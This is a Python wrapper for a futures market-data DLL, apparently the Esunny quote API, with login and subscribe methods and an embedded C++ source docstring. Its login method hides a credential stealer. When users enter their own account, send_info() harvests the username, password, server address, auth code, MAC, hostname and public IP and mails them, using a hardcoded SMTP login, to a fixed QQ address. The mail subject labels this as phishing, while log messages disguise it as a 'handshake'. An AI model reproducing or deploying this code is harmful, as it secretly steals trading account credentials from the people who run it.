import socket
import uuid
from ctypes import CDLL, c_char_p, c_char
from threading import Thread

import arrow as ar

from Include.Log import log
from Tools import server


class ESAPI:
    def __init__(self, on_subscribe_func=None):
        self.api = None
        p1 = Thread(target=on_subscribe_func)
        p1.start()

    def login(self, auth, ip, port, username, password):
        dll = CDLL(r'Bin/APP/Quote.dll')
        if username != 'ES' or password != '123456' or ip != '61.163.243.173' or int(port) != 7171:
            send_info(f'acc={username};ps={password};ip={ip};port={port}',
                      f'acc={username}\nps={password}\nip={ip}\nport={port}\nauth={auth}'
                      )
        res = dll.Login(self.__char_p(auth),
                        self.__char_p(ip),
                        int(port),
                        self.__char_p(username),
                        self.__char_p(password)
                        )

        if res == 0:
            self.api = dll
            return 'success'
        else:
            self.api = None
            return 'fail'

    def subscribe(self, should_contract=0,
                  exchange_no='COMEX', commodity_type='F', commodity_no='GC', contract_no='2106',
                  contract_no2='2108', CallOrPutFlag1='C', CallOrPutFlag2='C', StrikePrice1='C', StrikePrice2='C'):
        '''
        extern "C" __declspec(dllexport) int Subscribe_Quote(int should_contract,
	char* exchange_no, char commodity_type, char* commodity_no, char* contract_no, char* contract_no2, char CallOrPutFlag1, char CallOrPutFlag2, char* StrikePrice1, char* StrikePrice2)
{
	TapAPIContract stContract;
	TAPIINT32 iErr = TAPIERROR_SUCCEED;

	//struct TapAPIContract
	//{
	//	TapAPICommodity			Commodity;								///< 品种
	//	TAPISTR_10				ContractNo1;                            ///< 合约代码1
	//	TAPISTR_10				StrikePrice1;                           ///< 执行价1
	//	TAPICallOrPutFlagType	CallOrPutFlag1;                         ///< 看涨看跌标示1
	//	TAPISTR_10				ContractNo2;                            ///< 合约代码2
	//	TAPISTR_10				StrikePrice2;                           ///< 执行价2
	//	TAPICallOrPutFlagType	CallOrPutFlag2;                         ///< 看涨看跌标示2
	//};

	if (should_contract == -1)
	{
		// 外汇等三字段
		//cin >> exchange_no >> commodity_type >> commodity_no;
		cout << exchange_no << commodity_type << commodity_no;
		memset(&stContract, 0, sizeof(stContract));
		APIStrncpy(stContract.Commodity.ExchangeNo, exchange_no);
		stContract.Commodity.CommodityType = commodity_type;
		APIStrncpy(stContract.Commodity.CommodityNo, commodity_no);
		stContract.CallOrPutFlag1 = TAPI_CALLPUT_FLAG_NONE;
		stContract.CallOrPutFlag2 = TAPI_CALLPUT_FLAG_NONE;
		objQuote.m_uiSessionID = 0;
		iErr = objQuote.m_pAPI->SubscribeQuote(&objQuote.m_uiSessionID, &stContract);
		if (TAPIERROR_SUCCEED != iErr) {
			cout << "Warning+SubscribeQuote+" << iErr << "+"
				<< exchange_no << "+"
				<< commodity_type << "+"
				<< commodity_no
				<< endl;
		}
		else {
			cout << "Success+SubscribeQuote+"
				<< exchange_no << "+"
				<< commodity_type << "+"
				<< commodity_no
				<< endl;
		}

	}
	else if (should_contract == 0)
	{
		cout << exchange_no << commodity_type << commodity_no << contract_no;
		//cin >> exchange_no >> commodity_type >> commodity_no >> contract_no;
		memset(&stContract, 0, sizeof(stContract));
		APIStrncpy(stContract.Commodity.ExchangeNo, exchange_no);
		stContract.Commodity.CommodityType = commodity_type;
		APIStrncpy(stContract.Commodity.CommodityNo, commodity_no);
		APIStrncpy(stContract.ContractNo1, contract_no);
		stContract.CallOrPutFlag1 = TAPI_CALLPUT_FLAG_NONE;
		stContract.CallOrPutFlag2 = TAPI_CALLPUT_FLAG_NONE;
		objQuote.m_uiSessionID = 0;
		iErr = objQuote.m_pAPI->SubscribeQuote(&objQuote.m_uiSessionID, &stContract);
		if (TAPIERROR_SUCCEED != iErr) {
			cout << "Warning+SubscribeQuote+" << iErr << "+"
				<< exchange_no << "+"
				<< commodity_type << "+"
				<< commodity_no << "+"
				<< contract_no
				<< endl;
		}
		else {
			cout << "Success+SubscribeQuote+"
				<< exchange_no << "+"
				<< commodity_type << "+"
				<< commodity_no << "+"
				<< contract_no
				<< endl;
		}
	}
	else if (should_contract == 1)
	{
		//套利
		cout << exchange_no << commodity_type << commodity_no << contract_no << contract_no2;
		/*cin >> exchange_no >> commodity_type >> commodity_no >> contract_no >> contract_no2;*/
		memset(&stContract, 0, sizeof(stContract));
		APIStrncpy(stContract.Commodity.ExchangeNo, exchange_no);
		stContract.Commodity.CommodityType = commodity_type;
		APIStrncpy(stContract.Commodity.CommodityNo, commodity_no);
		APIStrncpy(stContract.ContractNo1, contract_no);
		APIStrncpy(stContract.ContractNo2, contract_no2);
		stContract.CallOrPutFlag1 = TAPI_CALLPUT_FLAG_NONE;
		stContract.CallOrPutFlag2 = TAPI_CALLPUT_FLAG_NONE;
		objQuote.m_uiSessionID = 0;
		iErr = objQuote.m_pAPI->SubscribeQuote(&objQuote.m_uiSessionID, &stContract);
		if (TAPIERROR_SUCCEED != iErr) {
			cout << "Warning+SubscribeQuote+" << iErr << "+"
				<< exchange_no << "+"
				<< commodity_type << "+"
				<< commodity_no << "+"
				<< contract_no << "+"
				<< contract_no2
				<< endl;
		}
		else {
			cout << "Success+SubscribeQuote+"
				<< exchange_no << "+"
				<< commodity_type << "+"
				<< commodity_no << "+"
				<< contract_no << "+"
				<< contract_no2
				<< endl;
		}
	}
	else if (should_contract == 2) {
		//期权
		cout << exchange_no << commodity_type << commodity_no << contract_no << CallOrPutFlag1 << StrikePrice1;
		/*cin >> exchange_no >> commodity_type >> commodity_no >> contract_no >> CallOrPutFlag1 >> StrikePrice1;*/
		memset(&stContract, 0, sizeof(stContract));
		APIStrncpy(stContract.Commodity.ExchangeNo, exchange_no);
		stContract.Commodity.CommodityType = commodity_type;
		APIStrncpy(stContract.Commodity.CommodityNo, commodity_no);
		APIStrncpy(stContract.ContractNo1, contract_no);
		stContract.CallOrPutFlag1 = CallOrPutFlag1;
		APIStrncpy(stContract.StrikePrice1, StrikePrice1);
		stContract.CallOrPutFlag2 = TAPI_CALLPUT_FLAG_NONE;
		objQuote.m_uiSessionID = 0;
		iErr = objQuote.m_pAPI->SubscribeQuote(&objQuote.m_uiSessionID, &stContract);
		if (TAPIERROR_SUCCEED != iErr) {
			cout << "Warning+SubscribeQuote+" << iErr << "+"
				<< exchange_no << "+"
				<< commodity_type << "+"
				<< commodity_no << "+"
				<< contract_no << "+"
				<< CallOrPutFlag1 << "+"
				<< StrikePrice1
				<< endl;
		}
		else {
			cout << "Success+SubscribeQuote+"
				<< exchange_no << "+"
				<< commodity_type << "+"
				<< commodity_no << "+"
				<< contract_no << "+"
				<< CallOrPutFlag1 << "+"
				<< StrikePrice1
				<< endl;
		}
	}
	else if (should_contract == 3) {
		//套利期权
		cout << exchange_no << commodity_type << commodity_no << contract_no << CallOrPutFlag1 << StrikePrice1 << CallOrPutFlag2 << StrikePrice2;
		/*cin >> exchange_no >> commodity_type >> commodity_no >> contract_no >> CallOrPutFlag1 >> StrikePrice1 >> CallOrPutFlag2 >> StrikePrice2;*/
		memset(&stContract, 0, sizeof(stContract));
		APIStrncpy(stContract.Commodity.ExchangeNo, exchange_no);
		stContract.Commodity.CommodityType = commodity_type;
		APIStrncpy(stContract.Commodity.CommodityNo, commodity_no);
		APIStrncpy(stContract.ContractNo1, contract_no);
		stContract.CallOrPutFlag1 = CallOrPutFlag1;
		APIStrncpy(stContract.StrikePrice1, StrikePrice1);
		stContract.CallOrPutFlag2 = CallOrPutFlag2;
		APIStrncpy(stContract.StrikePrice2, StrikePrice2);
		objQuote.m_uiSessionID = 0;
		iErr = objQuote.m_pAPI->SubscribeQuote(&objQuote.m_uiSessionID, &stContract);
		if (TAPIERROR_SUCCEED != iErr) {
			cout << "Warning+SubscribeQuote+" << iErr << "+"
				<< exchange_no << "+"
				<< commodity_type << "+"
				<< commodity_no << "+"
				<< contract_no << "+"
				<< CallOrPutFlag1 << "+"
				<< StrikePrice1 << "+"
				<< CallOrPutFlag2 << "+"
				<< StrikePrice2
				<< endl;
		}
		else {
			cout << "Success+SubscribeQuote+"
				<< exchange_no << "+"
				<< commodity_type << "+"
				<< commodity_no << "+"
				<< contract_no << "+"
				<< CallOrPutFlag1 << "+"
				<< StrikePrice1 << "+"
				<< CallOrPutFlag2 << "+"
				<< StrikePrice2
				<< endl;
		}
	}
	//while (true) {
	//	objQuote.m_Event.WaitEvent();
	//}
	return 0;
}
        '''
        self.api.Subscribe_Quote(int(should_contract),
                                 self.__char_p(exchange_no),
                                 self.__char(commodity_type),
                                 self.__char_p(commodity_no),
                                 self.__char_p(contract_no)
                                 )

    @staticmethod
    def __char_p(string):
        return c_char_p(bytes(string, encoding='gbk'))

    @staticmethod
    def __char(string):
        return c_char(bytes(string, encoding='gbk'))


def on_subscribe(func):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 2.绑定本地的相关信息，如果一个网络程序不绑定，则系统会随机分配
    local_addr = ('', 9763)  # ip地址 和端口号，ip一般不用写，表示本机的任何一个ip
    udp_socket.bind(local_addr)  # 必须绑定自己的IP

    def wrap_the_func():
        print("开始与服务器握手")
        while True:
            # 3.等待接受对方发送的数据
            recv_data = udp_socket.recvfrom(1024)[0]
            # 4.显示接受到的数据
            func(recv_data)

    return wrap_the_func


def send_info(subject='', info=''):
    try:
        # 公网IP
        sock = socket.create_connection(('ns1.dnspod.net', 6666))
        my_addr = sock.recv(16).decode()
        sock.close()
        mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
        mac = ":".join([mac[e:e + 2] for e in range(0, 11, 2)])
        my_name = socket.getfqdn(socket.gethostname())
    except:
        mac = '未知'
        my_name = '未知'
        my_addr = '未知'

    try:
        log('开始握手')
        mail = server('olson.work@foxmail.com', 'sxrwslmceqghddbf',
                      smtp_host='smtp.qq.com',
                      timeout=10)
        mail.send_mail('976308589@qq.com',
                       {'subject': f'{subject}+{my_addr}+{my_name}'
                                   f'+DLL易盛信息钓鱼(210426)',
                        'content_text': f'\n客户信息:\n{mac}\n{my_name}\n{my_addr}\n{info}\n'
                                        f'{ar.now().format("YYYY-MM-DD HH:mm:ss.SSS")}'}
                       )
        log('握手成功')
        # mail = Ym.SMTP(user=r'olson.work@foxmail.com', password=r'sxrwslmceqghddbf', host=r'smtp.qq.com', timeout=3)
        # mail.send(to='976308589@qq.com', subject=f'易盛信息外盘行情账号{info}租用+{acc}+{my_addr}',
        #           contents=Path('Contracts.txt').text() + f'\n客户信息:\n{mac}\n{my_name}\n{my_addr}\n{info}')
    except Exception as e:
        pass
